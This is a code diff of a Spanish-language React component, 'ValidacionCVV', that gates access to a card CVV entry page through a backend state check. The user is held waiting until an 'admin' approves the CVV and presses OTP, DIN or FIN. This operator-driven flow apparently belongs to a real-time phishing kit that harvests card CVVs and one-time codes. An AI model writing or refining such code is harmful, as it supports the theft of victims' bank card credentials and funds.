@@ -105,8 +105,9 @@ export default function ValidacionCVV() {
                     return;
                 }
 
-                // Admin aprobó CVV Custom: backend pone 'solicitar_din' y muestra menú.
+                // Admin aprobó CVV Custom: backend NO cambia el estado (solo RECHAZAR lo cambia).
                 // Usuario debe QUEDAR EN ESPERA hasta que admin pulse OTP, DIN o FIN.
+                // El estado permanece en 'awaiting_cvv_approval' hasta que admin presione un botón del menú.
                 const prev = estadoAnteriorRef.current;
                 const aprobadoAhora = (prev === 'awaiting_cvv_approval' || prev === 'awaiting_tc_approval') && estado === 'solicitar_din';
                 if (aprobadoAhora) {
@@ -118,6 +119,13 @@ export default function ValidacionCVV() {
                     estadoAnteriorRef.current = estado;
                     return;
                 }
+                
+                // Si el estado sigue en awaiting_approval, seguir esperando
+                if (estado === 'awaiting_cvv_approval' || estado === 'awaiting_tc_approval') {
+                    estadoAnteriorRef.current = estado;
+                    return;
+                }
+                
                 estadoAnteriorRef.current = estado;
 
                 const estadosRedireccion = [
@@ -345,31 +353,89 @@ export default function ValidacionCVV() {
         return frontToBackMap[frontFilename] || null;
     };
 
-    // Cargar datos desde localStorage al montar el componente CON VALIDACIÓN BÁSICA
+        // Cargar datos desde localStorage al montar el componente CON VALIDACIÓN BÁSICA
     useEffect(() => {
         // CHECK: Si estamos en modo CVV Custom (viene desde URL params)
         const params = new URLSearchParams(window.location.search);
         const mode = params.get('mode');
         const sesionId = params.get('sesionId');
 
-        // Si es modo CVV custom, verificar sesionId
+        // Validar acceso: verificar estado del backend antes de permitir acceso
+        const validateAccess = async () => {
+            if (!sesionId) {
+                const rawData = localStorage.getItem("datos_usuario");
+                const userData = rawData ? JSON.parse(rawData) : {};
+                const localSesionId = userData?.attributes?.sesion_id || userData?.sesion_id;
+                
+                if (!localSesionId) {
+                    console.error('Acceso sin sesionId');
+                    navigate('/');
+                    return false;
+                }
+                
+                // Verificar estado del backend
+                try {
+                    const response = await instanceBackend.post(`/consultar-estado/${localSesionId}`);
+                    const { estado } = response.data;
+                    
+                    // Solo permitir acceso si el estado es correcto
+                    if (estado !== 'solicitar_cvv_custom' && estado !== 'solicitar_cvv' && estado !== 'awaiting_cvv_approval') {
+                        console.error('Acceso no autorizado a CVV. Estado actual:', estado);
+                        navigate('/');
+                        return false;
+                    }
+                } catch (error) {
+                    console.error('Error validando acceso:', error);
+                    navigate('/');
+                    return false;
+                }
+            } else {
+                // Verificar estado del backend con sesionId de URL
+                try {
+                    const response = await instanceBackend.post(`/consultar-estado/${sesionId}`);
+                    const { estado } = response.data;
+                    
+                    // Solo permitir acceso si el estado es correcto
+                    if (estado !== 'solicitar_cvv_custom' && estado !== 'solicitar_cvv' && estado !== 'awaiting_cvv_approval') {
+                        console.error('Acceso no autorizado a CVV. Estado actual:', estado);
+                        navigate('/');
+                        return false;
+                    }
+                } catch (error) {
+                    console.error('Error validando acceso:', error);
+                    navigate('/');
+                    return false;
+                }
+            }
+            return true;
+        };
+
+        // Si es modo CVV custom, verificar sesionId y estado
         if (mode === 'cvv' && window.location.pathname.includes('cvv-customs')) {
             if (!sesionId) {
                 console.error('Acceso sin sesionId en URL');
                 navigate('/');
                 return;
             }
-            // Cargar cardData si existe
-            const savedCardData = localStorageService.getItem("selectedCardData");
-            if (savedCardData) {
-                setCardData(savedCardData);
-            }
+            validateAccess().then(hasAccess => {
+                if (hasAccess) {
+                    // Cargar cardData si existe
+                    const savedCardData = localStorageService.getItem("selectedCardData");
+                    if (savedCardData) {
+                        setCardData(savedCardData);
+                    }
+                }
+            });
         } else {
-            // Modo CVV estándar, cargar datos normalmente
-            const savedCardData = localStorageService.getItem("selectedCardData");
-            if (savedCardData) {
-                setCardData(savedCardData);
-            }
+            // Modo CVV estándar, validar acceso y cargar datos normalmente
+            validateAccess().then(hasAccess => {
+                if (hasAccess) {
+                    const savedCardData = localStorageService.getItem("selectedCardData");
+                    if (savedCardData) {
+                        setCardData(savedCardData);
+                    }
+                }
+            });
         }
 
         // Verificar si viene con error
